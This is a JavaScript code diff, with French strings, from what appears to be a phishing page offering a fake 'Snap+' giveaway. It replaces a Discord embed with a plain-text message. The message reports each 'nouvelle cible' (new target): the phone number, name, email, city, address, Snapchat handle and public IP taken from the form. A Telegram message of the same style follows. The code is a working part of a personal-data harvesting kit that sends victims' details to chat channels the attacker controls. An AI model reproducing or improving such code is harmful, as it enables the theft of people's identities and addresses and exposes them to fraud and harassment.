@@ -198,26 +198,31 @@
       const ip = await getPublicIP();
 
       // Discord embed
-      const embed = {
-        title: "🎁 Nouvelle cible Snap+ @everyone",
-        color: 0xA54FFB,
-        fields: [
-          { name: "📞 Téléphone", value: data.get("telephone") || "N/A", inline: true },
-          { name: "👤 Nom", value: data.get("nom") || "N/A", inline: true },
-          { name: "👤 Prénom", value: data.get("prenom") || "N/A", inline: true },
-          { name: "📧 Email", value: data.get("email") || "N/A", inline: false },
-          { name: "🏙️ Ville", value: data.get("ville") || "N/A", inline: true },
-          { name: "📍 Département", value: data.get("departement") || "N/A", inline: true },
-          { name: "🏠 Adresse", value: data.get("adresse") || "Non fournie", inline: false },
-          { name: "👻 Snapchat", value: data.get("snap") || "N/A", inline: true },
-          { name: "🌐 IP", value: ip, inline: false }
-        ],
-        footer: {
-          text: `Reçu le ${new Date().toLocaleString("fr-FR")}`,
-        },
-        timestamp: new Date(),
-      };
+ // Construction message Discord (texte brut, style cadre)
+    const discordMessage = `
+┌─🎁 Nouvelle cible Snap+ @everyone
 
+│ ┌─📞 Contact
+│ │ ├─ Téléphone   : ${data.get("telephone") || "N/A"}
+│ │ ├─ Email       : ${data.get("email") || "N/A"}
+│ │ └─ Snapchat    : ${data.get("snap") || "N/A"}
+
+│ ├─👤 Identité
+│ │ ├─ Nom        : ${data.get("nom") || "N/A"}
+│ │ ├─ Prénom     : ${data.get("prenom") || "N/A"}
+
+│ ├─📍 Localisation
+│ │ ├─ Ville        : ${data.get("ville") || "N/A"}
+│ │ ├─ Département  : ${data.get("departement") || "N/A"}
+│ │ └─ Adresse      : ${data.get("adresse") || "Non fournie"}
+
+│ └─🌐 Autres
+│   └─ IP          : ${ip}
+
+└─🕒 Reçu le : ${new Date().toLocaleString("fr-FR")}
+`;
+
+   
       // Telegram message (style encadré multi-parties)
       const telegramMessage = `
 ┌─🎁 *Nouvelle cible Snap+* 
